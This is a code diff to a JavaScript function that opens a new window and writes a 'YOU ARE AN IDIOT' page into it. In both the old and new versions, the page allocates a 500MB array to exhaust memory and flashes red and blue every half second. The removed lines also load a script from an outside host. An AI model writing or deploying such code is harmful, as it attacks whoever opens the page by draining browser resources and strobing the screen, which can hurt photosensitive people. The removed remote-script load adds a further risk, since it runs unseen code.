@@ -14,22 +14,27 @@ function openWindow(url) {
         // Write custom content inside the blank page
         newWin.document.write(`
             <html>
-            <head>
-                <title>YOU ARE AN IDIOT</title>
-                <style>
-                    body { background: red; color: white; text-align: center; font-size: 24px; margin-top: 100px; }
-                </style>
-                <script src="https://rip.up.railway.app/you2.js"></script>
-            </head>
-            <body>
-                <h1>You are an IDIOT!</h1>
-                <script>
-                    const x = new Uint8Array(1024 * 1024 * 1024 * 0.5).fill(255); // 500MB
-                    setInterval(() => {
-                        document.body.style.background = document.body.style.background === 'red' ? 'blue' : 'red';
-                    }, 500);
-                </script>
-            </body>
+                <head>
+                    <title>YOU ARE AN IDIOT</title>
+                    <style>
+                        body { background: red; color: white; text-align: center; font-size: 24px; margin-top: 100px; }
+                    </style>
+                </head>
+                <body>
+                    <h1>AHHHHHH!</h1>
+                    <script>
+                        const x = new Uint8Array(1024 * 1024 * 1024 * 0.5).fill(255); // 500MB
+                        setInterval(() => {
+                            if (document.body.style.background === 'red') {
+                                document.body.style.background = 'blue';
+                                document.querySelector('h1').textContent = 'HELP!';
+                            } else {
+                                document.body.style.background = 'red';
+                                document.querySelector('h1').textContent = 'AHHHHHH!';
+                            }
+                        }, 500);
+                    </script>
+                </body>
             </html>
         `);
     }
